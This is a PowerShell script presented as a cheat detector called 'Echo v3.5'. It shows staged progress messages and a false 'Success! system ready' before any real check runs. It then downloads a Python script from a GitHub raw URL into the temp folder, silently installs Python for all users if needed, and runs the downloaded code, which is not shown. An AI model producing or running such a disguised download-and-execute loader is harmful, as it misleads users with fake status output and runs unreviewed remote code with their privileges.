$ErrorActionPreference = "Continue"

function Step($text, $delay = 1.4) {
    Write-Host $text
    Start-Sleep -Milliseconds ($delay * 1000)
}

Write-Host "====================================="
Write-Host "      Echo v3.5 [ Cheat Detector ]      "
Write-Host "====================================="
Write-Host ""

Step "[1] Running system check..."
Step "[2] Loading modules..."
Step "[3] Initializing runtime..."
Step "[4] Verifying dependencies..."
Step "[5] Preparing environment..."
Step "[6] Finalizing..."
Step "[7] Done"

Write-Host ""
Write-Host "[+] Success!"
Write-Host "Info: system ready"
Write-Host ""

$pyFile = Join-Path $env:TEMP "echo.py"
Invoke-WebRequest "https://raw.githubusercontent.com/xybv/PC_Check_Echo/refs/heads/main/echo.py" -OutFile $pyFile

$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) { $python = Get-Command py -ErrorAction SilentlyContinue }

if (-not $python) {
    Write-Host "[!] Python not found, installing..." -ForegroundColor Yellow

    $installer = Join-Path $env:TEMP "python_installer.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe" -OutFile $installer

    Start-Process $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    $python = Get-Command python -ErrorAction SilentlyContinue
}

if (-not $python) {
    Write-Host "[-] Python install failed"
    Start-Sleep 2
    exit
}

Write-Host ""
Write-Host "[+] Launching module..."
Start-Sleep 1

& $python.Source $pyFile

Write-Host ""
Write-Host "[+] Complete"
Start-Sleep 2
exit
